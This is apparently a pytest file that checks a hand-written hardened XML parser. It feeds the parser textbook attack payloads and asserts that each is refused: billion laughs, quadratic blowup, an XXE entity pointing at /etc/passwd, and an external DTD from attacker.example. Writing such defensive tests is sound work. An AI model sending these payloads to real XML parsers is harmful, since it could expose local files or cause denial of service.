"""S2.5.1 — the hardening around `xml.etree`, tested with the attacks it exists to refuse.

Every payload here is a textbook XML attack written out in full rather than named, because
the point of the module under test is that *this repository* refuses them: `defusedxml` is
not a dependency (and adding one was not in scope), so the defence is hand-written and has
to be pinned by tests that would fail the moment someone "simplified" it back to a bare
`ET.fromstring`.

Nothing here touches the filesystem or the network, and the XXE payload is written to point
at a file that exists on every machine — if external entities were ever resolved, the test
would not error, it would *pass with `/etc/passwd` in the tree*, which is why the assertion
is on the refusal and not merely on "no exception".
"""

from __future__ import annotations

import pytest

from crossbid.ingestion.safe_xml import (
    MAX_XML_BYTES,
    MAX_XML_DEPTH,
    XmlRejectedError,
    parse_xml,
)

WELL_FORMED = b"""<?xml version="1.0" encoding="UTF-8"?>
<root xmlns="urn:example"><child id="1">text</child></root>"""

BILLION_LAUGHS = b"""<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>"""

QUADRATIC_BLOWUP = b"""<?xml version="1.0"?>
<!DOCTYPE bomb [<!ENTITY a "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">]>
<bomb>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</bomb>"""

EXTERNAL_ENTITY = b"""<?xml version="1.0"?>
<!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>"""

EXTERNAL_DTD = b"""<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://attacker.example/evil.dtd">
<data>hello</data>"""

UNDECLARED_ENTITY = b"<data>&secret;</data>"


def nested(depth: int) -> bytes:
    """A document `depth` elements deep, counting the root as depth 1."""
    return ("<a>" * depth + "</a>" * depth).encode()


def test_parses_a_well_formed_document_and_returns_its_root() -> None:
    # Act
    root = parse_xml(WELL_FORMED)

    # Assert
    assert root.tag == "{urn:example}root"
    assert root[0].text == "text"


def test_refuses_a_doctype_before_any_entity_is_expanded() -> None:
    """Billion laughs. The refusal is at the DOCTYPE, so no entity is ever declared."""
    # Act / Assert
    with pytest.raises(XmlRejectedError, match="document type declaration"):
        parse_xml(BILLION_LAUGHS)


def test_refuses_the_quadratic_blowup_payload() -> None:
    """The same defence, against the variant that needs no nesting to be expensive."""
    with pytest.raises(XmlRejectedError, match="document type declaration"):
        parse_xml(QUADRATIC_BLOWUP)


def test_refuses_an_external_entity_rather_than_reading_the_file() -> None:
    """XXE. A parser that resolved this would return a tree containing a real local file."""
    with pytest.raises(XmlRejectedError, match="document type declaration"):
        parse_xml(EXTERNAL_ENTITY)


def test_refuses_an_external_dtd_rather_than_fetching_it() -> None:
    """The other half of XXE: a DTD the parser would have to go to the network for."""
    with pytest.raises(XmlRejectedError, match="document type declaration"):
        parse_xml(EXTERNAL_DTD)


def test_refuses_an_entity_reference_that_was_never_declared() -> None:
    """Proof that entity *references* are not quietly resolved from anywhere else."""
    with pytest.raises(XmlRejectedError, match="not well-formed"):
        parse_xml(UNDECLARED_ENTITY)


def test_refuses_more_bytes_than_the_cap() -> None:
    """The cap is checked before a byte is parsed, so an over-cap payload is never read."""
    # Arrange
    oversized = b"<a>" + b"x" * MAX_XML_BYTES + b"</a>"

    # Act / Assert
    with pytest.raises(XmlRejectedError, match="larger than"):
        parse_xml(oversized)


def test_accepts_nesting_up_to_the_depth_cap() -> None:
    # Act
    root = parse_xml(nested(MAX_XML_DEPTH))

    # Assert
    assert root.tag == "a"


def test_refuses_nesting_deeper_than_the_cap() -> None:
    """Deep nesting is the one payload a DOCTYPE ban does not answer."""
    with pytest.raises(XmlRejectedError, match="nested more than"):
        parse_xml(nested(MAX_XML_DEPTH + 1))


def test_refuses_malformed_bytes() -> None:
    with pytest.raises(XmlRejectedError, match="not well-formed"):
        parse_xml(b"<a><b></a>")


def test_refuses_an_empty_body() -> None:
    with pytest.raises(XmlRejectedError, match="empty"):
        parse_xml(b"   ")


def test_the_caps_are_overridable_per_call() -> None:
    """The ESPD reader passes its own numbers; the defaults are not the contract."""
    with pytest.raises(XmlRejectedError, match="larger than"):
        parse_xml(WELL_FORMED, max_bytes=8)
    with pytest.raises(XmlRejectedError, match="nested more than"):
        parse_xml(WELL_FORMED, max_depth=1)
